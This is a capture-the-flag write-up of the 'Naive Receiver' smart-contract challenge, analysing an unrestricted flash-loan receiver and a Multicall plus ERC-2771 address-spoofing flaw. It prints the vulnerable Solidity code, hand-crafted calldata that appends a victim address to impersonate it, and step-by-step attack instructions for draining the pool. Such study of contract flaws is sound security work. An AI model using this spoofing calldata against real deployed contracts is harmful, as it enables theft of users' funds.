# Challenge - Naive Receiver

There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract.

A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.

## Objective of CTF

All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.

## Vulnerability Analysis

### Root Cause 1: Untrusted Flashloan Initiator

The `onFlashLoan` function in the `FlashLoanReceiver` contract is an implementation of the `IERC3156FlashBorrower` interface. However, in this implementation, the `initiator` and `data` parameters are completely ignored. Additionally, the function lacks any restrictions on who can initiate the flash loan.

Since there are no restrictions on who can initiate flash loans, and each flash loan incurs a fixed fee of 1 WETH, an attacker can continuously initiate flash loans on behalf of the `FlashLoanReceiver` contract. This process will eventually drain all the WETH from the `FlashLoanReceiver` contract.

The prototype for the `onFlashLoan` function in the `IERC3156FlashBorrower` interface is:

```solidity
function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32);
```

The implementation of the `onFlashLoan` function in the `FlashLoanReceiver` contract is as follows:

```solidity
function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32){
    assembly {
        // gas savings
        if iszero(eq(sload(pool.slot), caller())) {
            mstore(0x00, 0x48f5c3ed)
            revert(0x1c, 0x04)
        }
    }

    if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();

    uint256 amountToBeRepaid;
    unchecked {
        amountToBeRepaid = amount + fee;
    }

    _executeActionDuringFlashLoan();

    // Return funds to pool
    WETH(payable(token)).approve(pool, amountToBeRepaid);

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

### Root Cause 2: Arbitrary Address Spoofing

#### Quick Overview:

Contracts that implement both Multicall and ERC-2771 are vulnerable to address spoofing. An attacker can exploit this by wrapping malicious calldata in a forwarded request, using Multicall's `delegatecall` to manipulate the `_msgSender()` resolution in subsequent calls.

#### Demonstration

The `NaiveReceiverPool` contract supports meta-transactions (ERC-2771) and designates the `BasicForwarder` contract as a trusted forwarder. When interacting with `NaiveReceiverPool` via meta-transactions, the forwarder sends transactions on behalf of the user. However, in this context, the `msg.sender` during the transaction becomes the forwarder. To preserve the original user address, the forwarder appends the user's address to the end of the user's request data, i.e. `request.data`, as shown in the following code snippet:

```solidity
bytes memory payload = abi.encodePacked(request.data, request.from);
```

When `NaiveReceiverPool` needs to retrieve the actual user address (the "real" `msg.sender`), it does so using the `_msgSender()` function. This function is designed to reconstruct the original user address as follows:

```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}
```

In this function, if `msg.sender` is the trusted forwarder and `msg.data` is at least 20 bytes long (indicating that the user’s address has been correctly appended), it extracts the last 20 bytes of `msg.data` to retrieve the original user address. If these conditions are not met, it defaults to the parent contract’s `_msgSender()` method, which returns the standard `msg.sender`.

Do you see the potential vulnerability? When interacting with the `NaiveReceiverPool` contract through the forwarder, the `_msgSender()` function returns the last 20 bytes of `msg.data` as the user’s address, which is the "real" `msg.sender`.

Next, we'll explore how to use `multicall` to inject an arbitrary address and deceive the `_msgSender()` function.

Here is the `multicall` code snippet:

```solidity
function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
        results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
    return results;
}
```

This function allows multiple function calls to be executed in a single transaction. It takes an array of encoded function calls as input and executes each call using `functionDelegateCall`, returning an array of results.

Our objective is to impersonate the `feeReceiver` and call `withdraw()` in `NaiveReceiverPool` contract. The `withdraw` function is as follows:

```solidity
function withdraw(uint256 amount, address payable receiver) external {
    // Reduce deposits
    deposits[_msgSender()] -= amount;
    totalDeposits -= amount;

    // Transfer ETH to designated receiver
    weth.transfer(receiver, amount);
}
```

Here is our attack flow:

We can craft a malicious calldata for the forwarder to execute on our behalf. This calldata will invoke the `multicall` function in the `NaiveReceiverPool` contract. Within the `multicall` function, we will inject the `feeCollector` address into the `withdraw` function call in the `NaiveReceiverPool` contract.

Here is how we inject the `feeCollector` address into the `withdraw` function call:

The original calldata before injecting the feeCollector address

```
0xac9650d8                                                       -> multicall(bytes[]) signature
0000000000000000000000000000000000000000000000000000000000000020 -> bytes[] offset

0000000000000000000000000000000000000000000000000000000000000020 -> bytes[1] offset
0000000000000000000000000000000000000000000000000000000000000044 -> length of the bytes[1] in hexadecimal
00f714ce                                                         -> withdraw(uint256,address) signature
000000000000000000000000000000000000000000000036c090d0ca68880000 -> 1010 ether in hexadecimal
00000000000000000000000044E97aF4418b7a17AABD8090bEA0A471a366305C -> player address
```

This calldata represents a `multicall` that will invoke the `withdraw()` function with two parameters: the `amount` to withdraw (1010 ether) and the `recipient` address (player address). The ABI encoding length for `bytes[1]` is 68 bytes (0x44 in hexadecimal), which is the length of the first element in the `bytes[]` array

To inject the `feeCollector` address, we'll modify the calldata as follows:

```
0xac9650d8
0000000000000000000000000000000000000000000000000000000000000020

0000000000000000000000000000000000000000000000000000000000000020
0000000000000000000000000000000000000000000000000000000000000058 -> change to 0x58 due to the extra 20 bytes
00f714ce
000000000000000000000000000000000000000000000036c090d0ca68880000
00000000000000000000000044E97aF4418b7a17AABD8090bEA0A471a366305C
aE0bDc4eEAC5E950B67C6819B118761CaAF61946                         -> append the feeCollector address
```

Explanation:

1. **Length Adjustment**: We modify the calldata length from 68 bytes (0x44) to 88 bytes (0x58) to accommodate the extra 20 bytes needed for the `feeCollector` address.
2. **Appending the `feeCollector` Address**: By appending the `feeCollector` address at the end of the calldata, we trick the `_msgSender()` function into interpreting this address as the original sender. This allows us to withdraw funds as if we were the `feeCollector`.

### Attack steps:

1. Exhaust the WETH in the `receiver` contract by initiating a flash loan. At this point, the `NaiveReceiverPool` should contain 1,010 WETH.
2. Craft a malicious calldata to impersonate the `feeCollector` and invoke the `withdraw` function in the `NaiveReceiverPool` contract, thereby withdrawing all WETH and transferring it to the `player`.
3. Transfer all WETH from the `player` to the `recovery`.
